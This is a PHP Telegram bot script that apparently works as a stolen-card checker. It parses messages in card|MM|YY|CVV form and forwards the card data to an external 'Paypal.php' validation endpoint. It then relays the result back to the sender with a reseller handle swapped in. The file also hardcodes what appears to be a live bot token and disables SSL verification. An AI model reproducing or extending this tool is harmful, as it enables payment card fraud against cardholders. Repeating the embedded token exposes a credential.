<?php

$botToken = '8310617057:AAH22wb_CR4JI_pGWh7bkjiL1hP6UrcgSaM';
$apiURL = "https://api.telegram.org/bot$botToken/";

// Read Telegram update via php://input
$input = file_get_contents("php://input");
$update = json_decode($input, true);

// Check message text exists
if (!isset($update['message']['text'])) exit;

$message = $update['message']['text'];
$chat_id = $update['message']['chat']['id'];

// Match card format
if (preg_match('/\b\d{16}\|\d{2}\|\d{2,4}\|\d{3}\b/', $message, $matches)) {
    $cardData = $matches[0];
    $apiURLcard = "https://wizvenex.com/Paypal.php?lista=" . urlencode($cardData);

    // Call external API via cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiURLcard);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL check
    $response = curl_exec($ch);
    curl_close($ch);

    if (!$response) {
        $reply = "❌ API error or no response.";
    } else {
        $clean = strip_tags($response);
        $clean = str_replace("@VENEX444", "@STARBOYWTF", $clean);
        $reply = "Card: $cardData\n$clean";
    }
} else {
    $reply = "❌ No valid card format found.\nFormat: <code>1234567812345678|MM|YY|CVV</code>";
}

// Send reply using cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiURL . "sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $chat_id,
    'text' => $reply,
    'parse_mode' => 'HTML'
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL again
curl_exec($ch);
curl_close($ch);
